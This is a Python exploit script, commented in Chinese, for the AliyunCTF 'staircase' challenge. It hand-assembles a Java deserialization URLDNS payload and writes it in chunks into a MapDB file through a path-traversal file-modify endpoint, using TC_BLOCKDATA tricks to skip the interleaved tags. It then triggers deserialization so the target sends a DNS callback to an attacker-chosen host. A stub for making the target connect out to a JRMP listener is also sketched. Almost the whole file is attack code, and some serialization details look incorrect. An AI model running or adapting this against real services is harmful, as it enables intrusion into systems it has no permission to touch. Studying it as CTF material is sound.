#!/usr/bin/env python3
"""
CTF Challenge: staircase - AliyunCTF
Final Exploit Strategy: TC_BLOCKDATALONG Bypass

关键洞见：
1. 每次写入产生 <start>(7) + DATA(8) + <end>(5) = 20 bytes
2. 可以使用 TC_BLOCKDATALONG (0x7A) 跳过大量字节
3. 需要在正确位置构建完整的恶意序列化流

策略：
1. 第一次写入设置 stream header + TC_BLOCKDATALONG 指令
2. 计算需要跳过的字节数（包括所有 <start>/<end> 标签）
3. 在正确的位置放置恶意 gadget chain
"""

import requests
import base64
import struct
import sys
import time

def create_jrmp_stub(host, port):
    """
    创建 JRMP stub，让目标服务器连接到我们的服务器
    这需要配合 ysoserial 的 JRMPListener
    """
    # UnicastRef 对象指向 host:port
    # 当反序列化时，会尝试连接到这个地址
    payload = bytearray()
    
    # Stream header
    payload += b'\xac\xed\x00\x05'
    
    # TC_OBJECT
    payload += b'\x73'
    
    # TC_CLASSDESC for java.rmi.server.UnicastRef
    # 这个类在反序列化时会触发网络连接
    # ... 需要完整的类描述符
    
    return bytes(payload)


def create_urldns_payload(callback_url):
    """
    创建 URLDNS payload - 用于测试反序列化是否触发
    会发送 DNS 请求到指定 URL
    
    使用 java.util.HashMap + java.net.URL
    """
    # 这是一个简化的 URLDNS payload
    # 实际需要完整的序列化结构
    
    payload = bytearray()
    
    # Stream header
    payload += b'\xac\xed\x00\x05'
    
    # TC_OBJECT (0x73)
    payload += b'\x73'
    
    # TC_CLASSDESC (0x72) for java.util.HashMap
    payload += b'\x72'
    payload += struct.pack('>H', 17)  # name length
    payload += b'java.util.HashMap'
    payload += struct.pack('>q', 0x0507dac1c31660d1)  # serialVersionUID
    payload += b'\x03'  # SC_WRITE_METHOD | SC_SERIALIZABLE
    payload += struct.pack('>H', 2)  # field count
    
    # Field 1: float loadFactor
    payload += b'F'
    payload += struct.pack('>H', 10)
    payload += b'loadFactor'
    
    # Field 2: int threshold
    payload += b'I'
    payload += struct.pack('>H', 9)
    payload += b'threshold'
    
    # TC_ENDBLOCKDATA + TC_NULL (no superclass)
    payload += b'\x78\x70'
    
    # writeObject data
    payload += struct.pack('>f', 0.75)  # loadFactor value
    payload += struct.pack('>i', 0)  # threshold value
    
    # HashMap.writeObject: int bucket_count, int size, then entries
    payload += struct.pack('>i', 16)  # bucket count
    payload += struct.pack('>i', 1)  # size (1 entry)
    
    # Entry: key (URL object), value (URL object)
    # Key: java.net.URL
    payload += b'\x73'  # TC_OBJECT
    payload += b'\x72'  # TC_CLASSDESC
    payload += struct.pack('>H', 12)  # name length
    payload += b'java.net.URL'
    payload += struct.pack('>q', 0x962537361afce472)  # serialVersionUID
    payload += b'\x03'  # SC_WRITE_METHOD | SC_SERIALIZABLE
    payload += struct.pack('>H', 7)  # field count
    
    # URL fields
    fields = [
        (b'I', b'hashCode'),
        (b'I', b'port'),
        (b'L', b'authority', b'Ljava/lang/String;'),
        (b'L', b'file', b'Ljava/lang/String;'),
        (b'L', b'host', b'Ljava/lang/String;'),
        (b'L', b'protocol', b'Ljava/lang/String;'),
        (b'L', b'ref', b'Ljava/lang/String;'),
    ]
    
    for f in fields:
        payload += f[0]  # type
        payload += struct.pack('>H', len(f[1]))
        payload += f[1]
        if len(f) > 2:
            payload += b'\x74'  # TC_STRING for classname
            payload += struct.pack('>H', len(f[2]))
            payload += f[2]
    
    payload += b'\x78\x70'  # TC_ENDBLOCKDATA + TC_NULL
    
    # URL field values
    payload += struct.pack('>i', -1)  # hashCode = -1 (not computed)
    payload += struct.pack('>i', -1)  # port
    
    # Strings
    url_parts = callback_url.replace('http://', '').split('/', 1)
    host = url_parts[0]
    path = '/' + url_parts[1] if len(url_parts) > 1 else '/'
    
    for s in [host, path, host, 'http', None]:
        if s is None:
            payload += b'\x70'  # TC_NULL
        else:
            payload += b'\x74'  # TC_STRING
            payload += struct.pack('>H', len(s))
            payload += s.encode('utf-8')
    
    # writeObject data for URL (transient URLStreamHandler)
    payload += b'\x78'  # TC_ENDBLOCKDATA
    
    # Value: same URL object (reference)
    payload += b'\x71'  # TC_REFERENCE
    payload += struct.pack('>i', 0x7e0003)  # back-reference to URL
    
    # End of HashMap
    payload += b'\x78'  # TC_ENDBLOCKDATA
    
    return bytes(payload)


class StaircaseExploit:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
    
    def upload(self, content, filename="test.bin"):
        files = {'file': (filename, content, 'application/octet-stream')}
        return self.session.post(f"{self.url}/files/upload", files=files, timeout=10)
    
    def modify(self, path, data, offset):
        if len(data) > 8:
            data = data[:8]
        payload = {
            "fileName": path,
            "data": base64.b64encode(data).decode(),
            "offset": offset
        }
        return self.session.put(f"{self.url}/files/modify", json=payload, timeout=10)
    
    def get_icon(self):
        try:
            return self.session.get(f"{self.url}/files/icon", timeout=30)
        except:
            return None

    def exploit_blockdata_chain(self, mapdb_path, callback_url):
        """
        使用 TC_BLOCKDATA 链构建完整 payload
        
        Layout:
        Write 0 at offset X:    <start> [ACED 0005 7A LL LL LL LL] <end>
                                        ^stream hdr  ^BLOCKDATALONG ^length
        
        Write 1 at offset X+20: <start> [8 bytes payload] <end>
        Write 2 at offset X+40: <start> [8 bytes payload] <end>
        ...
        
        BLOCKDATALONG 跳过 <end><start> 对，让 payload 连续
        """
        print("=" * 60)
        print(" Staircase Exploit - BLOCKDATA Chain")
        print("=" * 60)
        print(f"Target: {self.url}")
        print(f"MapDB: {mapdb_path}")
        print()
        
        # Step 1: Upload
        print("[1] Uploading...")
        self.upload(b"X" * 512)
        
        # Step 2: 计算 payload
        print("[2] Building payload...")
        raw_payload = create_urldns_payload(callback_url)
        print(f"  URLDNS payload size: {len(raw_payload)} bytes")
        
        # 每次写入贡献 8 字节
        # 需要 ceil(len(payload) / 8) 次写入
        num_writes = (len(raw_payload) + 7) // 8
        print(f"  Writes needed: {num_writes}")
        
        # 但是每次写入后有 <end><start> = 12 字节需要跳过
        # 使用 TC_BLOCKDATA (77 0C) 跳过 12 字节
        
        # 重新设计 payload:
        # 每 6 字节 payload + 2 字节 (77 0C)
        # 最后一块不需要跳过
        
        # 第一块: ACED 0005 (4 bytes) + 77 0C (2 bytes) + XX XX (filler, 2 bytes)
        # 之后: 6 bytes payload + 77 0C
        
        # 分块
        chunks = []
        
        # 第一块: stream header + first blockdata
        first_chunk = b'\xac\xed\x00\x05\x77\x0c\x00\x00'  # 8 bytes
        chunks.append(first_chunk)
        # 这里 77 0C 告诉解析器: 跳过接下来 12 字节 (<end><start>)
        
        # 剩余 payload (从第一个对象开始，跳过 stream header)
        remaining = raw_payload[4:]  # 跳过 ACED 0005
        
        i = 0
        while i < len(remaining):
            chunk_data = remaining[i:i+6]
            if len(chunk_data) < 6:
                chunk_data = chunk_data + b'\x00' * (6 - len(chunk_data))
            
            if i + 6 < len(remaining):
                # 还有更多数据，添加跳过指令
                chunk = chunk_data + b'\x77\x0c'
            else:
                # 最后一块，不需要跳过
                chunk = chunk_data + b'\x00\x00'
            
            chunks.append(chunk)
            i += 6
        
        print(f"  Total chunks: {len(chunks)}")
        
        # Step 3: 写入
        print("[3] Writing chunks...")
        
        target_offset = 0x100250  # 序列化数据位置
        write_offset = target_offset - 7  # <start> 在 DATA 前 7 字节
        
        for idx, chunk in enumerate(chunks):
            offset = write_offset + idx * 20
            print(f"  Chunk {idx}: offset=0x{offset:x}, data={chunk.hex()}")
            
            resp = self.modify(mapdb_path, chunk, offset)
            if not resp or resp.status_code != 200:
                print(f"  [-] Write failed: {resp.text if resp else 'None'}")
                return False
        
        print("[+] All chunks written")
        
        # Step 4: 触发
        print("[4] Triggering...")
        print("  Check DNS/HTTP callback for success")
        resp = self.get_icon()
        if resp:
            print(f"  Response: {resp.status_code}")
        
        return True


def main():
    if len(sys.argv) < 4:
        print(f"""
Usage: {sys.argv[0]} <url> <mapdb_path> <callback_url>

Example:
    python {sys.argv[0]} http://localhost:8080 ../../../tmp/mapdb123temp http://your-server.com/

To get MapDB path:
    docker exec <container> ls /tmp/mapdb*
    
Callback URL will receive DNS lookup when exploit succeeds.
Use DNSlog or similar service to verify.
        """)
        sys.exit(1)
    
    url = sys.argv[1]
    mapdb_path = sys.argv[2]
    callback = sys.argv[3]
    
    exp = StaircaseExploit(url)
    exp.exploit_blockdata_chain(mapdb_path, callback)


if __name__ == "__main__":
    main()
